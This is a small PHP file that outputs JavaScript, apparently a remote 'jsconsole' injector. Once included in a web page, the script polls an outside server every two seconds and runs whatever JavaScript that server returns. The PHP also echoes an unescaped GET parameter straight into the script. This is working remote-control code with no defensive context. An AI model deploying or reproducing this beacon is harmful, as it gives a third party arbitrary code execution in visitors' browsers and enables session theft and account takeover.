<?php header("Content-type: text/javascript"); ?>
(function() {
  var token = "<?php echo $_GET["token"]; ?>";
  var lastexecuted = null;
  setInterval(function() {
    var request = new XMLHttpRequest();
    request.onreadystatechange = function() {
      if (request.readyState === 4 && request.status === 200) {
        if (request.responseText !== lastexecuted || lastexecuted === null) {
          lastexecuted = request.responseText;
          var script = document.createElement("SCRIPT");
          script.text = request.responseText;
          document.body.appendChild(script);
        }
      }
    };
    request.open("GET", "http://bit64.x10host.com/stuff/jsconsole/inject.php?token=" + token + "&refresh=" + (Math.random() * Math.random() * Math.random() * Math.random() * Math.random()), true);
    request.send();
  }, 2000);
})(); void 0;
